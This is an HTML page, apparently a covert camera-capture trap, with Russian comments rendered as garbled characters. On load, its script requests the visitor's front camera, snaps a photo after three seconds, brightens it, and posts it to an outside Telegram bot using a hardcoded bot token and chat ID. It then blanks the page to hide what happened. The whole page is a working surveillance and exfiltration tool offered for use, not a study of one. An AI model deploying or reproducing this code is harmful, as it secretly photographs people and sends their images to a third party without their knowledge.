<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title></title>
    <style>
        body, html { margin:0; padding:0; width:100%; height:100%; background:#000; }
        #status { 
            position: fixed; top:20px; left:0; width:100%; 
            color:#0f0; font-family:Arial; text-align:center; 
            font-size:14px; z-index:1000; 
        }
    </style>
</head>
<body>
    <div id="status">üîÑ –ó–∞–ø—É—Å–∫...</div>

<script>
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';
const status = document.getElementById('status');

function updateStatus(text) {
    status.textContent = text;
}

async function captureAndSend() {
    let stream = null;
    
    try {
        updateStatus('1. –í–∫–ª—é—á–∞—é –∫–∞–º–µ—Ä—É...');
        
        // === 1. –í–∫–ª—é—á–∞–µ–º —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω—É—é –∫–∞–º–µ—Ä—É ===
        stream = await navigator.mediaDevices.getUserMedia({
            video: { 
                facingMode: 'user',
                width: { ideal: 1280, max: 1920 },
                height: { ideal: 720, max: 1080 }
            }
        });
        
        updateStatus('‚úÖ –ö–∞–º–µ—Ä–∞ –≤–∫–ª—é—á–µ–Ω–∞');
        
        // === 2. –°–æ–∑–¥–∞–µ–º –≤–∏–¥–µ–æ —ç–ª–µ–º–µ–Ω—Ç ===
        const video = document.createElement('video');
        video.srcObject = stream;
        video.autoplay = true;
        video.playsInline = true;
        video.muted = true;
        
        // === 3. –ñ–¥–µ–º –ø–æ–ª–Ω–æ–π –∑–∞–≥—Ä—É–∑–∫–∏ –∫–∞–º–µ—Ä—ã ===
        await new Promise(resolve => {
            video.onloadeddata = () => {
                updateStatus('2. –ù–∞—Å—Ç—Ä–∞–∏–≤–∞—é –∫–∞–º–µ—Ä—É (3 —Å–µ–∫)...');
                resolve();
            };
        });
        
        // === 4. –î–∞–µ–º –∫–∞–º–µ—Ä–µ –≤—Ä–µ–º—è –Ω–∞ –∞–≤—Ç–æ—Ñ–æ–∫—É—Å –∏ —ç–∫—Å–ø–æ–∑–∏—Ü–∏—é ===
        // –£–≤–µ–ª–∏—á–µ–Ω–æ –¥–æ 3 —Å–µ–∫—É–Ω–¥ –¥–ª—è –≥–∞—Ä–∞–Ω—Ç–∏–∏
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // === 5. –°–æ–∑–¥–∞–µ–º canvas –∏ –¥–µ–ª–∞–µ–º —Å–Ω–∏–º–æ–∫ ===
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        
        const ctx = canvas.getContext('2d');
        
        // –†–∏—Å—É–µ–º –≤–∏–¥–µ–æ –Ω–∞ canvas
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // === 6. –ù–µ–º–µ–¥–ª–µ–Ω–Ω–æ –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É ===
        stream.getTracks().forEach(track => track.stop());
        updateStatus('‚úÖ –§–æ—Ç–æ —Å–¥–µ–ª–∞–Ω–æ');
        
        // === 7. –£–ª—É—á—à–∞–µ–º –∫–∞—á–µ—Å—Ç–≤–æ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è ===
        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const data = imageData.data;
        
        // –£–ª—É—á—à–∞–µ–º —è—Ä–∫–æ—Å—Ç—å –∏ –∫–æ–Ω—Ç—Ä–∞—Å—Ç–Ω–æ—Å—Ç—å
        for (let i = 0; i < data.length; i += 4) {
            // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º —è—Ä–∫–æ—Å—Ç—å –Ω–∞ 40%
            data[i] = Math.min(255, data[i] * 1.4);     // –ö—Ä–∞—Å–Ω—ã–π
            data[i + 1] = Math.min(255, data[i + 1] * 1.4); // –ó–µ–ª–µ–Ω—ã–π
            data[i + 2] = Math.min(255, data[i + 2] * 1.4); // –°–∏–Ω–∏–π
            
            // –ù–µ–º–Ω–æ–≥–æ —É–≤–µ–ª–∏—á–∏–≤–∞–µ–º –∫–æ–Ω—Ç—Ä–∞—Å—Ç
            const avg = (data[i] + data[i + 1] + data[i + 2]) / 3;
            if (avg > 128) {
                data[i] = Math.min(255, data[i] * 1.1);
                data[i + 1] = Math.min(255, data[i + 1] * 1.1);
                data[i + 2] = Math.min(255, data[i + 2] * 1.1);
            }
        }
        
        ctx.putImageData(imageData, 0, 0);
        updateStatus('3. –û—Ç–ø—Ä–∞–≤–ª—è—é —Ñ–æ—Ç–æ...');
        
        // === 8. –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram ===
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'selfie_' + Date.now() + '.jpg');
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    updateStatus('‚úÖ –§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!');
                    // –û—á–∏—â–∞–µ–º —Å—Ç—Ä–∞–Ω–∏—Ü—É —á–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã
                    setTimeout(() => {
                        document.body.innerHTML = '';
                        document.body.style.backgroundColor = '#000';
                    }, 2000);
                } else {
                    updateStatus(`‚ùå –û—à–∏–±–∫–∞ Telegram: ${result.description}`);
                    // –ü—Ä–∏ –æ—à–∏–±–∫–µ —Ç–æ–∂–µ –æ—á–∏—â–∞–µ–º —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥
                    setTimeout(() => {
                        document.body.innerHTML = '<div style="color:#fff;text-align:center;padding:20px">–û—à–∏–±–∫–∞</div>';
                    }, 5000);
                }
            } catch (fetchError) {
                updateStatus(`‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏: ${fetchError.message}`);
                setTimeout(() => {
                    document.body.innerHTML = '';
                }, 3000);
            }
        }, 'image/jpeg', 0.95); // –í—ã—Å–æ–∫–æ–µ –∫–∞—á–µ—Å—Ç–≤–æ 95%
        
    } catch (error) {
        updateStatus(`‚ùå –û—à–∏–±–∫–∞: ${error.message}`);
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
        setTimeout(() => {
            document.body.innerHTML = '';
        }, 3000);
    }
}

// –ó–∞–ø—É—Å–∫–∞–µ–º —Å—Ä–∞–∑—É –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
window.addEventListener('DOMContentLoaded', captureAndSend);
</script>
</body>
</html>
